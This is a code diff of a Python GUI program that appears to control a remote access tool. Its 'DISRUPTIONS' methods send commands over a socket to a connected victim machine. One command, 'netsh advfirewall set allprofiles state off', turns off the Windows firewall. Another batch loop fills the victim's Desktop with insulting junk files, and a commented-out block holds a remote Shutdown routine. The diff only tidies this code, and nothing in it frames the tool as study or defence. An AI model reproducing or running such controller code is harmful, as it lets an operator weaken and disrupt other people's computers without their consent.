@@ -87,6 +87,7 @@ ScreenManager:
                 on_press: app.Firewall()
 '''
 
+
 class Main(MDApp):
     def build(self):
         self.theme_cls.theme_style = "Dark"
@@ -191,18 +192,17 @@ class Main(MDApp):
             print(f"{output[0]}\n{output[1]}\n{output[8]}")
             print(f"SID\t\t\t\t\t\t\t{output2[2]}")
             break
-###############################DISRUPTIONS############################################
+
+    ###############################DISRUPTIONS############################################
     def Firewall(self):
         while True:
             command = "netsh advfirewall set allprofiles state off"
-            command = command.encode()
-            self.currConn.send(command)
+            self.currConn.send(command.encode())
             print('[+] Command sent')
-            output = client.recv(1024)
-            output = output.decode()
+            output = self.currConn.recv(1024).decode()
             print(f"Output: {output}")
             break
-        
+
     # File creation disruption
     def FileCreate(self):
         while True:
@@ -210,6 +210,7 @@ class Main(MDApp):
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
             break
+
 
 """
 UNTESTED SO I COMMENTED DISRUPRTIONS OUT FOR NOW OMEGALUL
@@ -231,13 +232,7 @@ def Shutdown():
         currConn.send(command)
         print('Command sent to client: ', command)
         break
-def FileCreate():
-    while True:
-        command = 'cd Desktop && FOR /L %A IN (1 1 20) DO (echo. > “You suck eggs %A.txt”)'
-        command = command.encode()
-        currConn.send(command)
-        print('Command sent to client: ', command)
-        break
+
 """
 
 if __name__ == '__main__':
